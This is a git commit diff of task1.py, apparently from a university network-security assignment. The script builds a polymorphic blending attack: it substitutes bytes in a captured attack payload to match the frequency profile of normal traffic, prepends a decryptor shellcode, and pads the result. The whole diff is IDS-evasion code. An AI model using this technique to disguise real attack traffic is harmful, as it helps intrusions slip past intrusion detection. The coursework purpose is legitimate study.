54a8767d060c5dd7d018d68468b97121023122d9
eggh234 <61628697+eggh234@users.noreply.github.com>
2024-04-04 17:45:20 -0400

    Add files via upload

--- task1.py
+++ task1.py
@@ -11,44 +11,48 @@ ATTACKBODY_PATH = "yhuang916.pcap"  # replace the file name by the one you downl
 if __name__ == "__main__":
     attack_payload_bytes = getAttackBodyPayload(ATTACKBODY_PATH)
     artificial_payload_bytes = getArtificialPayload(ARTIFICIAL_PATH)
+    artificial_payload = artificial_payload_bytes.decode("utf8")
+    attack_payload = attack_payload_bytes.decode("utf8")
 
     # Generate substitution table based on byte frequency in file
-    substitution_table = getSubstitutionTable(
-        artificial_payload_bytes, attack_payload_bytes
-    )
+    substitution_table = getSubstitutionTable(artificial_payload, attack_payload)
 
     # Substitution table will be used to encrypt attack body and generate corresponding
     # xor_table which will be used to decrypt the attack body
-    (xor_table, adjusted_attack_body) = substitute(
-        attack_payload_bytes, substitution_table
-    )
+    (xor_table, adjusted_attack_body) = substitute(attack_payload, substitution_table)
 
     # For xor operation, should be a multiple of 4
     while len(xor_table) < 128:
         # CHECK: 128 can be some other number (greater than and multiple of 4)
         # per your attack trace length
-        xor_table += b"\x00"
+        xor_table.append(chr(0))
 
     # For xor operation, should be a multiple of 4
     while len(adjusted_attack_body) < 128:
         # CHECK: 128 can be some other number (greater than and multiple of 4) per
         # your attack trace length
-        adjusted_attack_body += b"\x00"
+        adjusted_attack_body.append(chr(0))
 
     # Read in decryptor binary to append at the start of payload
     # Prepare byte list for payload
+
     with open("shellcode.bin", mode="rb") as file:
         shellcode_content = file.read()
 
-    # Construct the raw payload with binary data
-    raw_payload = shellcode_content + adjusted_attack_body + xor_table
+    b_list = []
+    for b in shellcode_content:
+        b_list.append(chr(b))
 
-    # The padding function is now expected to work with binary data directly.
-    # It will append bytes to raw_payload to match the length of artificial_payload_bytes, if needed.
-    padded_payload = padding(artificial_payload_bytes, raw_payload)
+    # Raw payload will be constructed by encrypted attack body and xor_table
+    raw_payload = b_list + adjusted_attack_body + xor_table
+
+    while len(raw_payload) < len(artificial_payload):
+        padding(artificial_payload, raw_payload)
+
+    # Write prepared payload to Output file
+    with open("output", "wb") as result_file:
+        result_file.write(bytearray("".join(raw_payload), "utf8"))
 
     # Write code here to generate payload.bin!
-    # Write prepared payload to Output file
-    # Note: Changed the output to 'output.bin' to reflect binary data handling
-    with open("payload.bin", "wb") as payload_file:
-        payload_file.write(adjusted_attack_body + xor_table)
+    # with open("payload.bin", "wb") as payload_file:
+    #     payload_file.write(bytearray("".join(adjusted_attack_body + xor_table), "utf8"))
